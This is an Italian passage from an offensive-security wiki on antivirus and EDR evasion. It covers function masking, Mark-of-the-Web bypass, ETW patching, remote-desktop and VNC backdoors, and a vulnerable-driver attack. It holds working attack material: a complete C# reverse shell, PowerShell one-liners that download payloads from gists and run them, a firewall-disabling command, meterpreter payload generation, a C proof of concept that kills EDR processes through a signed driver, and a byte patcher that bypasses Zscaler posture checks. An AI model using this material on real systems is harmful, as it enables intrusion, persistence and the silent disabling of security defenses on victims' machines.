- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt è un PE Crypter .NET scritto in Nim
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor è in grado di convertire EXE/DLL esistenti in shellcode e poi caricarli

### Mascheramento self per funzione assistito dal compilatore LLVM

Invece di mascherare un intero implant solo mentre è inattivo, un backend LLVM X86 modificato può mantenere le funzioni selezionate mascherate con XOR ogni volta che sono inattive. La PoC Function Peekaboo seleziona i nomi demangled che contengono `REG_`, inserisce stub di ingresso/uscita position-independent attorno al codice macchina finale e genera un handler di mascheramento condiviso in `.text`; le firme a livello sorgente e la convenzione di chiamata Windows x64 restano invariate.<sup>[[38]](#references)[[39]](#references)</sup>

#### Trasformazione del flusso di controllo nel backend

Questa operazione va eseguita dopo la selezione delle istruzioni e l'ottimizzazione, perché la trasformazione deve coprire **ogni return emesso** e conoscere il layout esatto x86. Un `MachineFunctionPass` pre-emissione individua l'ultimo `MachineInstr::isReturn()`, lo elimina affinché il percorso finale prosegua nell'epilogo aggiunto e sostituisce i return precedenti con `JMP_1 handler`. Mantieni eventuali teardown dello stack/frame generati dal compilatore prima di ogni return; reindirizza solo l'istruzione return stessa.<sup>[[38]](#references)[[39]](#references)</sup>

`X86AsmPrinter::emitFunctionBodyStart()` e `X86AsmPrinter::emitFunctionBodyEnd()` emettono gli stub per funzione, mentre `emitEndOfAsmFile()` emette l'handler. I simboli condivisi tra le fasi di emissione permettono a un branch del prologo di puntare all'epilogo successivo; per un `je` near emesso manualmente, scrivi `0F 84` seguito dall'espressione MC a quattro byte `target - address_after_je`. Le chiamate e i jump all'handler possono invece essere emessi come oggetti `MCInst` (`CALL64pcrel32` e `JMP_1`). Un pass deve restituire `false` per una funzione non selezionata se non ha apportato modifiche; la PoC restituisce erroneamente `true` in questo caso.<sup>[[38]](#references)[[39]](#references)</sup>

#### Metadati e inizializzazione pre-CRT

La PoC inserisce una chiave XOR e record da 16 byte contenenti un puntatore a funzione rilocato dal loader e una lunghezza runtime in `.funcmeta`. Sebbene il campo C sia un `uint32_t`, l'handler accede a un QWORD all'offset `+8` del record, usando la lunghezza e il relativo padding, e avanza di `0x10` byte tra i record. I nomi delle sezioni PE occupano solo otto byte, quindi la ricerca runtime vede `.funcmet`. Un patcher esterno aggiunge una sezione eseguibile `.stub`, salva nel stub il vecchio RVA dell'entry point e reindirizza `AddressOfEntryPoint`; lo stub PIC ricava la base dell'immagine da `gs:[0x60]` → `[PEB+0x10]`, percorre gli import PE32+ per risolvere una `VirtualProtect` già importata e viene eseguito prima del CRT.<sup>[[38]](#references)[[39]](#references)</sup>

L'inizializzazione imposta un sentinel in `gs:[0xE8]` e chiama ogni funzione presente nei metadati. Il prologo, che resta sempre leggibile, registra l'inizio della funzione in `gs:[0xF0]`, rileva il sentinel e salta il corpo ancora non mascherato. L'epilogo usa quindi `call handler`; dopo che l'handler salva 13 registri (`0x68` byte), l'indirizzo di ritorno in `[rsp+0x68]` corrisponde alla fine della funzione trasformata, perciò `end - start` può essere scritto nel record dei metadati. Dopo aver mascherato tutti i corpi, lo stub azzera il sentinel e salta a `ImageBase + original_entry_point_RVA`.<sup>[[38]](#references)[[39]](#references)</sup>

Durante una chiamata normale, il prologo chiama lo stesso handler simmetrico per decodificare il corpo. Il percorso finale prosegue nell'epilogo aggiunto, mentre ogni return precedente salta direttamente all'handler condiviso. Anche l'epilogo normale usa `jmp handler` anziché `call`, così che, dopo aver rimaskerizzato il corpo, il `ret` dell'handler consumi l'indirizzo di ritorno del chiamante originale e conservi il risultato della funzione in `RAX`.<sup>[[38]](#references)[[39]](#references)</sup>

#### Primitiva di mascheramento e indicatori per l'analisi

L'handler individua il record corrente, salta il prologo visibile di dimensione fissa (in questa build `0x46` byte), imposta il resto su `PAGE_EXECUTE_READWRITE`, esegue XOR byte per byte usando il byte meno significativo della chiave e poi lo imposta su `PAGE_EXECUTE_READ`. Lo stesso ciclo decodifica quindi all'ingresso e codifica a ogni uscita normale.<sup>[[38]](#references)[[39]](#references)</sup>

Gli indicatori ad alta affidabilità di questo design includono:<sup>[[38]](#references)[[39]](#references)</sup>

- un entry point all'interno di `.stub` eseguibile e una sezione `.funcmet` contenente una chiave e puntatori a `.text` rilocati;
- parsing di PEB, tabella degli import e tabella delle sezioni prima del CRT, seguito da chiamate tramite ogni puntatore dei metadati;
- prologhi PIC `call`/`pop` identici e numerosi return reindirizzati a un unico handler;
- scritture in `gs:[0xE8]`, `gs:[0xF0]` e `gs:[0xF8]`, seguite da ripetute transizioni `VirtualProtect` e scritture XOR byte per byte in pagine eseguibili mappate dall'immagine.

Questa tecnica elude gli scanner di memoria, non offre protezione crittografica: il file modificato contiene ancora il corpo originale in chiaro, e un debugger può fermarsi su `VirtualProtect` o sul ciclo XOR e acquisire la funzione attiva. Anche l'XOR a un solo byte, i metadati leggibili e il limite fisso `0x46` rendono semplice il recupero offline.<sup>[[38]](#references)[[39]](#references)</sup>

> [!WARNING]
> Gli slot TEB della PoC sono thread-local, ma le pagine di codice modificate sono condivise dall'intero processo. L'ingresso concorrente o ricorsivo può quindi invertire nuovamente le istruzioni mentre un'altra invocazione è in esecuzione; anche le eccezioni e le uscite non locali possono saltare la rimaskerizzazione. Un'implementazione robusta deve sincronizzare le transizioni, ripristinare la protezione effettivamente restituita tramite `lpflOldProtect`, evitare lunghezze dello stub hard-coded, verificare l'allineamento dello stack x64 sia nei percorsi `call` sia in quelli `jmp` e chiamare `FlushInstructionCache` dopo aver riscritto byte eseguibili. Microsoft specifica esplicitamente che la responsabilità della coerenza della cache delle istruzioni quando si modifica codice eseguibile ricade sul chiamante.<sup>[[38]](#references)[[39]](#references)[[40]](#references)</sup>

## SmartScreen & MoTW

Potresti aver visto questa schermata scaricando ed eseguendo da Internet alcuni eseguibili.

Microsoft Defender SmartScreen è un meccanismo di sicurezza progettato per proteggere l'utente finale dall'esecuzione di applicazioni potenzialmente dannose.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen si basa principalmente sulla reputazione: le applicazioni scaricate raramente attivano SmartScreen, che avvisa l'utente finale e gli impedisce di eseguire il file (anche se è comunque possibile eseguirlo facendo clic su More Info -> Run anyway).

**MoTW** (Mark of The Web) è un [Alternate Data Stream NTFS](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) denominato Zone.Identifier, creato automaticamente quando si scaricano file da Internet, insieme all'URL da cui sono stati scaricati.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Verifica dell'ADS Zone.Identifier di un file scaricato da Internet.</p></figcaption></figure>

> [!TIP]
> È importante notare che gli eseguibili firmati con un certificato di firma **attendibile** **non attivano SmartScreen**.

Un modo molto efficace per impedire che i payload ricevano il Mark of The Web consiste nel racchiuderli in un contenitore, ad esempio un ISO. Questo perché il Mark-of-the-Web (MOTW) **non può** essere applicato ai volumi **non NTFS**.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) è uno strumento che inserisce i payload in contenitori di output per eludere il Mark-of-the-Web.

Esempio di utilizzo:

```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
    +             o     +           +             o     +         +
    o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
   :: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
   for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
    o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
    Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```

Ecco una demo per aggirare SmartScreen impacchettando payload all'interno di file ISO usando [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) è un potente meccanismo di logging di Windows che consente alle applicazioni e ai componenti di sistema di **registrare eventi**. Tuttavia, può anche essere usato dai prodotti di sicurezza per monitorare e rilevare attività dannose.

Analogamente a quanto avviene quando AMSI viene disabilitato (aggirato), è possibile far sì che la funzione **`EtwEventWrite`** del processo in user space ritorni immediatamente senza registrare alcun evento. Questo si ottiene applicando una patch alla funzione in memoria per farla ritornare immediatamente, disabilitando di fatto il logging ETW per quel processo.

Puoi trovare ulteriori informazioni in **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) e [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.<sup>[[33]](#references)[[34]](#references)</sup>


## C# Assembly Reflection

Caricare binari C# in memoria è una tecnica nota da parecchio tempo ed è ancora un ottimo modo per eseguire i tuoi strumenti di post-exploitation senza farti rilevare dall'AV.

Poiché il payload verrà caricato direttamente in memoria senza toccare il disco, dovremo solo preoccuparci di applicare una patch ad AMSI per l'intero processo.

La maggior parte dei framework C2 (sliver, Covenant, metasploit, CobaltStrike, Havoc, ecc.) offre già la possibilità di eseguire assembly C# direttamente in memoria, ma ci sono diversi modi per farlo:

- **Fork\&Run**

Consiste nel **creare un nuovo processo sacrificabile**, iniettare il codice malevolo di post-exploitation in quel nuovo processo, eseguirlo e, al termine, terminare il nuovo processo. Questo approccio presenta vantaggi e svantaggi. Il vantaggio del metodo Fork and Run è che l'esecuzione avviene **al di fuori** del processo del nostro impianto Beacon. Ciò significa che, se qualcosa nella nostra attività di post-exploitation va storto o viene rilevato, ci sono **molte più probabilità** che il nostro **impianto sopravviva**. Lo svantaggio è che ci sono **più probabilità** di essere rilevati dai **rilevamenti comportamentali**.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Consiste nell'iniettare il codice malevolo di post-exploitation **nel processo stesso**. In questo modo puoi evitare di creare un nuovo processo e di farlo analizzare dall'AV, ma lo svantaggio è che, se qualcosa va storto durante l'esecuzione del payload, ci sono **molte più probabilità** di **perdere il tuo beacon**, perché potrebbe andare in crash.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Se vuoi saperne di più sul caricamento degli assembly C#, consulta questo articolo [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) e il loro BOF InlineExecute-Assembly ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

Puoi anche caricare assembly C# **da PowerShell**: dai un'occhiata a [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) e al [video di S3cur3th1sSh1t](https://www.youtube.com/watch?v=oe11Q-3Akuk).

## Usare altri linguaggi di programmazione

Come proposto in [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), è possibile eseguire codice malevolo usando altri linguaggi, dando alla macchina compromessa accesso **all'ambiente dell'interprete installato nella condivisione SMB controllata dall'attaccante**.

Consentendo l'accesso ai binari dell'interprete e all'ambiente nella condivisione SMB, puoi **eseguire codice arbitrario in questi linguaggi nella memoria** della macchina compromessa.

Il repository indica che Defender continua ad analizzare gli script, ma usando Go, Java, PHP ecc. abbiamo **maggiore flessibilità nell'aggirare le firme statiche**. I test con script reverse shell casuali e non offuscati scritti in questi linguaggi hanno avuto esito positivo.

## TokenStomping

Token stomping manipola il token di accesso di un prodotto di sicurezza, come un EDR o un AV. Ridurre i privilegi del token può lasciare il processo in esecuzione, impedendogli però di effettuare ispezioni privilegiate o azioni di remediation.

Per impedirlo, Windows potrebbe **impedire ai processi esterni** di ottenere handle sui token dei processi di sicurezza.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Usare software attendibile

### Chrome Remote Desktop

Come descritto in [**questo post del blog**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide), è facile installare Chrome Remote Desktop sul PC di una vittima e poi usarlo per prenderne il controllo e mantenere la persistenza:<sup>[[35]](#references)</sup>
1. Scarica il programma da https://remotedesktop.google.com/, fai clic su "Set up via SSH", quindi fai clic sul file MSI per Windows per scaricarlo.
2. Esegui l'installer in modalità silenziosa sulla macchina della vittima (sono richiesti i privilegi di amministratore): `msiexec /i chromeremotedesktophost.msi /qn`
3. Torna alla pagina di Chrome Remote Desktop e fai clic su Next. La procedura guidata ti chiederà di autorizzare; fai clic sul pulsante Authorize per continuare.
4. Esegui il comando fornito apportando le modifiche necessarie: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (il parametro `--pin` imposta il PIN senza usare l'interfaccia grafica).
 

## Tecniche avanzate di evasione

{{#ref}}
virtualized-payload-execution.md
{{#endref}}

L'evasione è un argomento molto complesso; a volte devi considerare molte fonti diverse di telemetria in un solo sistema, quindi è praticamente impossibile rimanere completamente non rilevati in ambienti maturi.

Ogni ambiente in cui operi avrà punti di forza e debolezze specifici.

Ti consiglio vivamente di guardare questo intervento di [@ATTL4S](https://twitter.com/DaniLJ94), per avere un'introduzione alle tecniche avanzate di evasione.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

Questo è anche un altro ottimo intervento di [@mariuszbit](https://twitter.com/mariuszbit) sull'evasione in profondità.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Tecniche obsolete**

### **Verificare quali parti Defender rileva come dannose**

Puoi usare [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck), che **rimuove parti del binario** finché **non individua quale parte Defender** rileva come dannosa, per poi estrarla.\
Un altro strumento che fa **la stessa cosa è** [**avred**](https://github.com/dobin/avred), che offre il servizio sul web all'indirizzo [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Server Telnet**

Fino a Windows 10, tutte le versioni di Windows includevano un **server Telnet** che potevi installare (come amministratore) eseguendo:

```bash
pkgmgr /iu:"TelnetServer" /quiet
```

Configuralo per avviarsi all'avvio del sistema ed eseguilo ora:

```bash
sc config TlntSVR start= auto obj= localsystem
```

**Cambia la porta telnet (stealth) e disabilita il firewall:**

```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```

### UltraVNC

Scaricalo da: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (ti servono i download bin, non il setup)

**SULL'HOST**: Esegui _**winvnc.exe**_ e configura il server:

- Abilita l'opzione _Disable TrayIcon_
- Imposta una password in _VNC Password_
- Imposta una password in _View-Only Password_

Poi sposta il binario _**winvnc.exe**_ e il file _**UltraVNC.ini**_ appena creato all'interno della **vittima**

#### **Connessione inversa**

L'**attaccante** deve **eseguire all'interno** del proprio **host** il binario `vncviewer.exe -listen 5900`, così sarà **pronto** a ricevere una **connessione VNC** inversa. Poi, all'interno della **vittima**: avvia il daemon winvnc con `winvnc.exe -run` ed esegui `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**ATTENZIONE:** Per mantenere la stealth, evita di fare alcune cose

- Non avviare `winvnc` se è già in esecuzione, altrimenti apparirà un [popup](https://i.imgur.com/1SROTTl.png). Verifica se è in esecuzione con `tasklist | findstr winvnc`
- Non avviare `winvnc` senza `UltraVNC.ini` nella stessa directory, altrimenti si aprirà [la finestra di configurazione](https://i.imgur.com/rfMQWcf.png)
- Non eseguire `winvnc -h` per visualizzare la guida, altrimenti apparirà un [popup](https://i.imgur.com/oc18wcu.png)

### GreatSCT

Scaricalo da: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)

```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```

All'interno di GreatSCT:

```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```

Ora **avvia il lister** con `msfconsole -r file.rc` e **esegui** il **payload xml** con:

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```

**L'attuale Defender terminerà il processo molto rapidamente.**

### Compilare la nostra reverse shell

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Prima Revershell in C#

Compilala con:

```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```

Usalo con:

```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
	public class Program
	{
		static StreamWriter streamWriter;

		public static void Main(string[] args)
		{
			using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
			{
				using(Stream stream = client.GetStream())
				{
					using(StreamReader rdr = new StreamReader(stream))
					{
						streamWriter = new StreamWriter(stream);

						StringBuilder strInput = new StringBuilder();

						Process p = new Process();
						p.StartInfo.FileName = "cmd.exe";
						p.StartInfo.CreateNoWindow = true;
						p.StartInfo.UseShellExecute = false;
						p.StartInfo.RedirectStandardOutput = true;
						p.StartInfo.RedirectStandardInput = true;
						p.StartInfo.RedirectStandardError = true;
						p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
						p.Start();
						p.BeginOutputReadLine();

						while(true)
						{
							strInput.Append(rdr.ReadLine());
							//strInput.Append("\n");
							p.StandardInput.WriteLine(strInput);
							strInput.Remove(0, strInput.Length);
						}
					}
				}
			}
		}

		private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            StringBuilder strOutput = new StringBuilder();

            if (!String.IsNullOrEmpty(outLine.Data))
            {
                try
                {
                    strOutput.Append(outLine.Data);
                    streamWriter.WriteLine(strOutput);
                    streamWriter.Flush();
                }
                catch (Exception err) { }
            }
        }

	}
}
```

### C# con il compilatore

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```

[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Download ed esecuzione automatici:

```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```


{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

Elenco di offuscatori C#: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++

```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```

- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](https://github.com/l0ss/Grouper2)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Uso di Python per creare un esempio di injector:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Altri strumenti

```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```

### Altro

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – Eliminare AV/EDR dallo spazio kernel

Storm-2603 ha sfruttato una piccola utility per console nota come **Antivirus Terminator** per disabilitare le protezioni degli endpoint prima di distribuire ransomware. Lo strumento include un **proprio driver vulnerabile ma *firmato*** e ne abusa per eseguire operazioni privilegiate nel kernel che nemmeno i servizi AV Protected-Process-Light (PPL) possono bloccare.<sup>[[12]](#references)</sup>

Punti chiave
1. **Driver firmato**: il file scritto su disco è `ServiceMouse.sys`, ma il binario è il driver legittimamente firmato `AToolsKrnl64.sys` dell’“System In-Depth Analysis Toolkit” di Antiy Labs. Poiché il driver ha una firma Microsoft valida, viene caricato anche quando Driver-Signature-Enforcement (DSE) è abilitato.
2. **Installazione del servizio**:
   ```powershell
   sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
   sc start  ServiceMouse
   ```
   La prima riga registra il driver come **kernel service** e la seconda lo avvia, rendendo `\\.\ServiceMouse` accessibile dallo spazio utente.
3. **IOCTL esposti dal driver**
   | Codice IOCTL | Funzionalità                              |
   |-----------:|-----------------------------------------|
   | `0x99000050` | Terminare un processo arbitrario tramite PID (usato per terminare i servizi Defender/EDR) |
   | `0x990000D0` | Eliminare un file arbitrario dal disco |
   | `0x990001D0` | Scaricare il driver e rimuovere il servizio |

   Proof-of-concept C minimale:
   ```c
   #include <windows.h>
   
   int main(int argc, char **argv){
       DWORD pid = strtoul(argv[1], NULL, 10);
       HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
       DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
       CloseHandle(hDrv);
       return 0;
   }
   ```
4. **Perché funziona**: BYOVD aggira completamente le protezioni in modalità utente; il codice eseguito nel kernel può aprire processi *protetti*, terminarli o manomettere oggetti del kernel, indipendentemente da PPL/PP, ELAM o altre funzionalità di hardening.

Rilevamento / Mitigazione  
•  Abilita l’elenco di blocco dei driver vulnerabili di Microsoft (`HVCI`, `Smart App Control`), così Windows rifiuta di caricare `AToolsKrnl64.sys`.  
•  Monitora la creazione di nuovi servizi *kernel* e genera un avviso quando un driver viene caricato da una directory scrivibile da tutti o non presente nell’elenco di elementi consentiti.  
•  Cerca handle in modalità utente a oggetti dispositivo personalizzati seguiti da chiamate `DeviceIoControl` sospette.

### Aggirare i controlli di postura di Zscaler Client Connector tramite patch dei binari su disco

**Client Connector** di Zscaler applica localmente le regole di postura del dispositivo e si affida a Windows RPC per comunicare i risultati agli altri componenti. Due scelte progettuali deboli rendono possibile un bypass completo:

1. La valutazione della postura avviene **interamente lato client** (al server viene inviato un valore booleano).
2. Gli endpoint RPC interni verificano soltanto che l’eseguibile che si connette sia **firmato da Zscaler** (tramite `WinVerifyTrust`).<sup>[[11]](#references)</sup>

**Applicando patch a quattro binari firmati su disco**, è possibile neutralizzare entrambi i meccanismi:

| Binario | Logica originale modificata | Risultato |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Restituisce sempre `1`, quindi ogni controllo risulta conforme |
| `ZSAService.exe` | Chiamata indiretta a `WinVerifyTrust` | Sostituita con NOP ⇒ qualsiasi processo (anche non firmato) può collegarsi alle pipe RPC |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Sostituita con `mov eax,1 ; ret` |
| `ZSATunnel.exe` | Controlli d’integrità del tunnel | Saltati |

Estratto minimo del patcher:

```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
    data = f.read()
    off = data.find(pattern)
    if off == -1:
        print("pattern not found")
    else:
        f.seek(off)
        f.write(replacement)
```

Dopo aver sostituito i file originali e riavviato lo stack dei servizi:

* **Tutti** i controlli di postura risultano **verdi/conformi**.
* I binari non firmati o modificati possono aprire gli endpoint RPC named pipe (ad es. `\\RPC Control\\ZSATrayManager_talk_to_me`).
* L'host compromesso ottiene accesso senza restrizioni alla rete interna definita dalle policy di Zscaler.

Questo case study dimostra come le decisioni di trust prese esclusivamente lato client e i semplici controlli delle firme possano essere aggirati con poche patch ai byte.

## Abuso delle funzionalità attendibili di Microsoft Defender `BTR.sys`

Il driver **Boot-Time Removal** di Defender è un utile termine di paragone rispetto al BYOVD classico. `BTR.sys` è un componente di remediation legittimo firmato da Microsoft, senza bug di memory corruption né interfaccia IOCTL; dopo aver ottenuto l'accesso amministrativo e `SeLoadDriverPrivilege`, un operatore può invece falsificare la transazione privata di remediation e ottenere le operazioni previste su file e registro in Ring-0. Si tratta di una **primitiva di neutralizzazione di AV/EDR post-compromissione, non di accesso iniziale o escalation dei privilegi**; inoltre, il driver può essere estratto dalla risorsa `BOOTTIMETOOL` del `MpEngine.dll` del target, anziché importare un vistoso driver di terze parti.<sup>[[36]](#references)</sup>

### Preparazione del driver monouso

Normalmente Defender salva la risorsa come file casuale `[a-z]{8}.sys` e registra un servizio kernel con un nome simile. `DriverEntry` legge il valore `Args` del servizio, apre l'ADS NTFS indicato, decritta e convalida l'elenco delle azioni, scrive i feedback e, dopo l'esecuzione riuscita, restituisce `0xC0000056` (`STATUS_DELETE_PENDING`), in modo che il driver venga scaricato invece di rimanere residente. Un servizio falsificato presenta i seguenti valori caratteristici.<sup>[[36]](#references)[[37]](#references)</sup>

```text
Type         = 1
Start        = 1
ErrorControl = 0
ImagePath    = \??\C:\Windows\System32\drivers\<random>.sys
Group        = Boot Bus Extender
Args         = C:\Windows\System32\drivers\<random>.sys:changelist
```

Lo stream `:changelist` contiene un blob crittografato con RC4. Le build analizzate riutilizzano una chiave fissa di 256 byte, quindi la crittografia non costituisce un confine di autorizzazione. Un plaintext valido contiene un header globale di 24 byte (`Magic=0xFEE1DEAD`, `Version=2`, `PayloadOffset=0x10`, CRC dell'header e un ID di transazione derivato dal payload), seguito da un percorso di feedback UTF-16 con terminazione null e da un numero qualsiasi di elementi. Ogni elemento ha un header di 16 byte (`DataSize`, `Action`, `HeaderCRC`, `DataCRC`) seguito da dati specifici per l'azione, che terminano con **esattamente quattro byte NUL**. Ogni regione dell'header e dei dati viene verificata singolarmente con CRC-32, polinomio `0xEDB88320`, stato iniziale `0xFFFFFFFF` e **nessuno XOR finale** (`~CRC32`); lo stato del CRC viene reimpostato per ogni regione.<sup>[[36]](#references)[[37]](#references)</sup>

